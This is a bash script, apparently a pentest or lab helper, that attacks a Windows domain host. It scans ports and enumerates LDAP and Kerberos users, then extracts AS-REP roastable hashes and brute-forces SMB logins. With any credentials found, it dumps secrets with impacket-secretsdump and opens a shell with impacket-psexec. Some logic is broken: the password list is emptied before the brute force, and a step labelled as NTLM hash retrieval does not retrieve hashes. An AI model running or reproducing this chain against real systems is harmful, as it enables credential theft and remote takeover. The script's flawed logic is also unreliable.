#!/bin/bash

# Usage: ./enum_win.sh <target-ip> <domain>
TARGET=$1
DOMAIN=$2

USERLIST="users.txt"
PASSLIST="passwords.txt"

if [ -z "$TARGET" ] || [ -z "$DOMAIN" ]; then
    echo "Usage: $0 <target-ip> <domain>"
    exit 1
fi

echo "[*] Initialising enumeration for $TARGET in domain $DOMAIN..."
> $USERLIST
> $PASSLIST

echo "[*] Scanning for open ports..."
nmap -p- --min-rate=1000 -T4 -v -oN nmap_full_scan.txt $TARGET

echo "[*] Identifying Windows services..."
nmap -p 88,135,139,389,445,1433,3306,3389 -sC -sV --script="ldap*,smb*,krb5-enum-users,mysql*" -oN nmap_service_enum.txt $TARGET

echo "[*] Enumerating LDAP for usernames..."
nmap -p 389 --script="ldap-search" --script-args="base='DC=${DOMAIN//./,DC=}'" -oN ldap_enum.txt $TARGET | grep "dn: CN=" | cut -d ' ' -f 2 >> $USERLIST

echo "[*] Checking for Kerberos users..."
nmap -p 88 --script="krb5-enum-users" --script-args="userdb=$USERLIST" -oN kerberos_enum.txt $TARGET

echo "[*] Extracting AS-REP roastable accounts (no pre-auth)..."
GetNPUsers.py "$DOMAIN/" -usersfile $USERLIST -dc-ip $TARGET -format hashcat | tee asrep_hashes.txt

echo "[*] Enumerating SMB shares..."
nmap --script=smb-enum-shares,smb-enum-users -p 445 -oN smb_enum.txt $TARGET

echo "[*] Attempting SMB brute force..."
nmap --script=smb-brute -p 445 --script-args="userdb=$USERLIST,passdb=$PASSLIST" -oN smb_bruteforce.txt $TARGET

echo "[*] Attempting NTLM hash retrieval..."
nmap -p 445 --script="smb-protocols,smb2-security-mode,smb2-capabilities,smb-os-discovery" -oN smb_ntlm.txt $TARGET

echo "[*] Checking SMB vulnerabilities..."
nmap -p 445 --script="smb-vuln*" -oN smb_vulns.txt $TARGET

echo "[*] Checking MySQL..."
nmap -p 3306 --script="mysql-audit,mysql-databases,mysql-users,mysql-info" -oN mysql_enum.txt $TARGET

# Extract credentials if found
grep "Valid account" smb_bruteforce.txt | awk '{print $4}' >> $USERLIST
grep "Valid account" smb_bruteforce.txt | awk '{print $6}' >> $PASSLIST

# If credentials exist, rerun enumeration with authentication
if [ -s $PASSLIST ]; then
    echo "[*] Credentials found! Running authenticated enumeration..."
    while read -r USER; do
        while read -r PASS; do
            echo "[*] Running Impacket secretsdump for $USER..."
            impacket-secretsdump "$DOMAIN/$USER:$PASS@$TARGET" | tee -a secretsdump_output.txt

            echo "[*] Running Impacket psexec for $USER..."
            impacket-psexec "$DOMAIN/$USER:$PASS@$TARGET"
        done < $PASSLIST
    done < $USERLIST
fi

echo "[*] Scan complete. Check output files."
